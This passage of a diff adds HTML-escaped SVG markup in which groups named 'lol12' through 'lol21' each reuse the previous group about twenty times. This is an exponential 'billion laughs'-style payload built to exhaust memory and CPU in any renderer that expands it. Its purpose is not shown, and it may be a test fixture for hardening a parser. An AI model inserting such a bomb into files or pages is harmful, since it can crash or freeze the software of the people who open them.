+        &lt;\use x&#x3D;&quot;73.78722984405549&quot; y&#x3D;&quot;45.72688559073798&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;83.48580727629619&quot; y&#x3D;&quot;54.807894322471796&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;74.58088383281451&quot; y&#x3D;&quot;77.92195302403253&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;44.291212819945095&quot; y&#x3D;&quot;87.34774830005982&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;83.36523319836944&quot; y&#x3D;&quot;23.16798306706601&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;96.81444046937484&quot; y&#x3D;&quot;5.2774561492802246&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;89.95938568108261&quot; y&#x3D;&quot;29.147173394800095&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;32.975073322245684&quot; y&#x3D;&quot;40.16263700735965&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;99.89239911680178&quot; y&#x3D;&quot;37.01030665694668&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;20.699434353696077&quot; y&#x3D;&quot;66.70684057498156&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;60.938310024700925&quot; y&#x3D;&quot;37.376996444610654&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;63.10163249886118&quot; y&#x3D;&quot;36.425373183180746&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;84.49405783143527&quot; y&#x3D;&quot;59.926738723542506&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;73.2080909970135&quot; y&#x3D;&quot;89.38289111619969&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;48.84059359223066&quot; y&#x3D;&quot;36.388133614052606&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.14735313186185&quot; y&#x3D;&quot;97.57038466935218&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.87014039415748&quot; y&#x3D;&quot;2.575114834382286&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;24.657594449909993&quot; y&#x3D;&quot;4.732431250418346&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;57.38629526339841&quot; y&#x3D;&quot;49.82676102525444&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol14&quot;&gt;
+        &lt;\use x&#x3D;&quot;81.84092374670004&quot; y&#x3D;&quot;29.680483822620708&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;83.43072201396157&quot; y&#x3D;&quot;54.53762140485742&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;16.80581095053596&quot; y&#x3D;&quot;85.37355724651124&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;15.58268175286307&quot; y&#x3D;&quot;70.93254414424837&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;95.45432384560834&quot; y&#x3D;&quot;44.429369184898974&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;72.37135439939598&quot; y&#x3D;&quot;44.527310814626745&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;30.335266967245154&quot; y&#x3D;&quot;34.75948072414855&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;61.344081146225214&quot; y&#x3D;&quot;8.72131840763818&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;83.6600022066328&quot; y&#x3D;&quot;4.229194242065293&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;89.18555499674456&quot; y&#x3D;&quot;58.31102588857844&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;85.64831503377637&quot; y&#x3D;&quot;31.261089681482733&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;87.0324886085992&quot; y&#x3D;&quot;75.88769798707739&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;33.4571984085957&quot; y&#x3D;&quot;58.99813636666957&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;33.405581899608784&quot; y&#x3D;&quot;56.9826241860579&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;6.439743080409488&quot; y&#x3D;&quot;62.64686934431444&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;50.41975455551048&quot; y&#x3D;&quot;54.988531668010154&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;9.220089817739419&quot; y&#x3D;&quot;66.29167786894807&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;60.21876208670186&quot; y&#x3D;&quot;73.51284513167172&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;81.15591284482555&quot; y&#x3D;&quot;18.01531544036297&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;22.45617791144966&quot; y&#x3D;&quot;11.428626023427901&quot; xlink:href&#x3D;&quot;#lol13&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol15&quot;&gt;
+        &lt;\use x&#x3D;&quot;75.03607811356817&quot; y&#x3D;&quot;37.783949302425576&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;55.5735362263052&quot; y&#x3D;&quot;18.383275608818884&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;99.83484082842635&quot; y&#x3D;&quot;36.52363082638136&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;32.871633221188524&quot; y&#x3D;&quot;43.41580856605122&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;6.967033691481483&quot; y&#x3D;&quot;44.48766879206143&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;91.98279004549154&quot; y&#x3D;&quot;34.91269733723438&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;78.1961560970167&quot; y&#x3D;&quot;73.70897525277972&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;27.638521195105735&quot; y&#x3D;&quot;28.856707468316223&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;57.20554031047118&quot; y&#x3D;&quot;59.57979045041828&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;38.23710335148412&quot; y&#x3D;&quot;33.93571813331111&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;25.308573961184543&quot; y&#x3D;&quot;87.94286814646608&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;16.062165353754963&quot; y&#x3D;&quot;60.99981366146762&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;32.46173434329677&quot; y&#x3D;&quot;15.870435092617608&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;9.309250189223373&quot; y&#x3D;&quot;30.299062966770375&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;17.115447510474414&quot; y&#x3D;&quot;46.8796210849659&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;13.734403552853703&quot; y&#x3D;&quot;0.3532268703089869&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;56.9399453320574&quot; y&#x3D;&quot;0.7338418966533866&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;72.40649305090494&quot; y&#x3D;&quot;32.17059198810163&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.150651115195068&quot; y&#x3D;&quot;98.58523190883865&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;7.984383100287918&quot; y&#x3D;&quot;79.08807205915797&quot; xlink:href&#x3D;&quot;#lol14&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol16&quot;&gt;
+        &lt;\use x&#x3D;&quot;48.35826486444626&quot; y&#x3D;&quot;10.454530178584099&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;65.08637773802312&quot; y&#x3D;&quot;91.66805147735275&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;99.47878465458778&quot; y&#x3D;&quot;81.19502977086998&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;42.498926647096745&quot; y&#x3D;&quot;45.66088680786687&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;44.391391905323374&quot; y&#x3D;&quot;10.448001315635235&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;35.87118554767908&quot; y&#x3D;&quot;27.478793250609968&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;99.58595162792011&quot; y&#x3D;&quot;78.7570229730555&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;13.570954040881&quot; y&#x3D;&quot;77.41672043931655&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;42.37766990815586&quot; y&#x3D;&quot;95.95065837917149&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;10.857224138005927&quot; y&#x3D;&quot;58.26223563498979&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;51.409064988198196&quot; y&#x3D;&quot;72.58113308692809&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;1.9926277147821025&quot; y&#x3D;&quot;76.66675219444889&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;41.61534973680091&quot; y&#x3D;&quot;66.6466180543814&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;18.806760281458057&quot; y&#x3D;&quot;61.02313230477549&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;25.479872187419282&quot; y&#x3D;&quot;99.27851016307017&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;85.98733866330586&quot; y&#x3D;&quot;11.263391566582548&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;2.832781775306259&quot; y&#x3D;&quot;31.167237087439137&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;59.54883283628342&quot; y&#x3D;&quot;21.41781152426976&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;83.64759052992932&quot; y&#x3D;&quot;45.084550281388104&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;0.03520406472323767&quot; y&#x3D;&quot;32.849661140769925&quot; xlink:href&#x3D;&quot;#lol15&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol17&quot;&gt;
+        &lt;\use x&#x3D;&quot;11.267058569155196&quot; y&#x3D;&quot;84.78356659988971&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;51.31871821058793&quot; y&#x3D;&quot;27.976704023689457&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;97.29648376427332&quot; y&#x3D;&quot;62.47961164466894&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;94.2375582885764&quot; y&#x3D;&quot;62.64881259065056&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.61671304605655&quot; y&#x3D;&quot;62.267484085945114&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;89.83470963888252&quot; y&#x3D;&quot;11.843279702003763&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;20.299258425174827&quot; y&#x3D;&quot;23.70678617391676&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;60.32422667467732&quot; y&#x3D;&quot;47.30072657577642&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;57.85649719941707&quot; y&#x3D;&quot;51.6533086038605&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;76.12190248297672&quot; y&#x3D;&quot;41.96687316240912&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;0.2472129412429913&quot; y&#x3D;&quot;7.383867781663323&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;82.83217214654113&quot; y&#x3D;&quot;53.710999454049826&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;45.8171944282078&quot; y&#x3D;&quot;30.203134999608928&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;23.013226339538683&quot; y&#x3D;&quot;28.231747336837&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;88.4548755581437&quot; y&#x3D;&quot;14.88380248653347&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;9.971491093125085&quot; y&#x3D;&quot;15.51962846272824&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;53.31406904455825&quot; y&#x3D;&quot;64.90162579989106&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;0.31415028713490667&quot; y&#x3D;&quot;68.85939836939453&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;23.55800184694291&quot; y&#x3D;&quot;80.4584665128639&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;79.20235303706285&quot; y&#x3D;&quot;13.411172035139218&quot; xlink:href&#x3D;&quot;#lol16&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol18&quot;&gt;
+        &lt;\use x&#x3D;&quot;51.41999484569803&quot; y&#x3D;&quot;98.53278755498623&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;67.02098503102071&quot; y&#x3D;&quot;38.644042379740625&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;9.4580420749947&quot; y&#x3D;&quot;81.74782000486277&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;88.01339383219927&quot; y&#x3D;&quot;58.662468121690544&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;50.448935487515264&quot; y&#x3D;&quot;16.572979078810167&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;39.951676304604376&quot; y&#x3D;&quot;31.5278706062472&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;79.8798891848425&quot; y&#x3D;&quot;17.43455510102819&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;23.94674034504617&quot; y&#x3D;&quot;18.668865853057614&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;36.3614040119873&quot; y&#x3D;&quot;55.38517745598649&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;68.89451975258446&quot; y&#x3D;&quot;35.28143348454358&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;68.42819798618319&quot; y&#x3D;&quot;30.744638415349034&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;85.0049205874437&quot; y&#x3D;&quot;59.93435804981544&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.583480967740446&quot; y&#x3D;&quot;8.578405007336542&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;51.72470503837039&quot; y&#x3D;&quot;43.453462465135004&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;25.30841177573717&quot; y&#x3D;&quot;7.226479102126914&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;29.06003807462244&quot; y&#x3D;&quot;14.054853069703398&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;48.07342310808339&quot; y&#x3D;&quot;34.78674052033107&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;64.2585244032321&quot; y&#x3D;&quot;59.50134894303298&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;31.057747852631433&quot; y&#x3D;&quot;5.515261167027241&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;62.170155825059524&quot; y&#x3D;&quot;51.926827990583305&quot; xlink:href&#x3D;&quot;#lol17&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol19&quot;&gt;
+        &lt;\use x&#x3D;&quot;41.3916428575156&quot; y&#x3D;&quot;46.53390628725085&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;58.174498524768524&quot; y&#x3D;&quot;13.821062095654357&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;34.8411094531874&quot; y&#x3D;&quot;47.911903739400664&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;30.579928444717307&quot; y&#x3D;&quot;17.272588574748603&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;70.4551847893065&quot; y&#x3D;&quot;6.159586980170784&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;51.45339731400512&quot; y&#x3D;&quot;9.661462417627343&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;29.19356511179413&quot; y&#x3D;&quot;99.24580347459295&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;0.9373554476843959&quot; y&#x3D;&quot;93.55776635693455&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;99.58483526305594&quot; y&#x3D;&quot;45.5417720621885&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;39.63581921781459&quot; y&#x3D;&quot;69.96786155280569&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;1.2178585666190456&quot; y&#x3D;&quot;70.60142481228611&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;54.26037228034052&quot; y&#x3D;&quot;77.49551090736934&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;24.552196211045562&quot; y&#x3D;&quot;76.89940256609037&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;51.369154011344875&quot; y&#x3D;&quot;29.148556026003636&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;53.479694045794005&quot; y&#x3D;&quot;23.313063383835964&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.32528510920381&quot; y&#x3D;&quot;72.47969308134093&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;55.776560222056304&quot; y&#x3D;&quot;38.75187490857984&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;19.120509260792208&quot; y&#x3D;&quot;23.276724433911745&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;67.1342284285774&quot; y&#x3D;&quot;4.385512927326141&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;19.05108561893001&quot; y&#x3D;&quot;9.243071670266778&quot; xlink:href&#x3D;&quot;#lol18&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol20&quot;&gt;
+        &lt;\use x&#x3D;&quot;55.98680742158917&quot; y&#x3D;&quot;85.77476061489865&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;33.10972217075644&quot; y&#x3D;&quot;18.665882600455387&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;94.31177766910687&quot; y&#x3D;&quot;95.10907787829875&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;32.899529255440754&quot; y&#x3D;&quot;26.603292031849147&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;47.117081542939474&quot; y&#x3D;&quot;63.143574258179&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;42.78470893465194&quot; y&#x3D;&quot;0.9930880841157452&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;40.57393945650707&quot; y&#x3D;&quot;7.529470226288804&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;96.53873957214554&quot; y&#x3D;&quot;52.13839667296026&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;2.453441409480428&quot; y&#x3D;&quot;94.75268164260127&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;65.6135175919686&quot; y&#x3D;&quot;20.226484388807144&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;30.116959753184524&quot; y&#x3D;&quot;44.78108262772973&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;40.900705961611465&quot; y&#x3D;&quot;76.67120183639905&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;52.61357648762102&quot; y&#x3D;&quot;89.9632768662046&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;39.42352306849265&quot; y&#x3D;&quot;8.636894971078334&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;77.28931452741904&quot; y&#x3D;&quot;68.2784739549797&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.327570352396567&quot; y&#x3D;&quot;13.39485923954994&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;91.7308600182192&quot; y&#x3D;&quot;49.536083784169335&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;46.480293660762264&quot; y&#x3D;&quot;56.37137494367382&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;66.42874375993321&quot; y&#x3D;&quot;52.793285813367476&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;13.590670203534906&quot; y&#x3D;&quot;99.38002415373393&quot; xlink:href&#x3D;&quot;#lol19&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol21&quot;&gt;
+        &lt;\use x&#x3D;&quot;14.997623445727182&quot; y&#x3D;&quot;8.62338230611821&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;88.45446666894965&quot; y&#x3D;&quot;32.31499411754714&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;30.688369436006813&quot; y&#x3D;&quot;53.58896810021512&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;47.78676516568756&quot; y&#x3D;&quot;26.40980758102618&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;27.718770820943085&quot; y&#x3D;&quot;4.12970559650121&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;63.68350829725025&quot; y&#x3D;&quot;15.765355713460337&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;15.77061056985578&quot; y&#x3D;&quot;36.7734233352008&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;51.153053106364545&quot; y&#x3D;&quot;75.30148534354191&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;67.73891922472006&quot; y&#x3D;&quot;11.197055777531284&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;81.29746037225209&quot; y&#x3D;&quot;23.49670428577415&quot; xlink:href&#x3D;&quot;#lol20&quot; &#x2F;&gt;
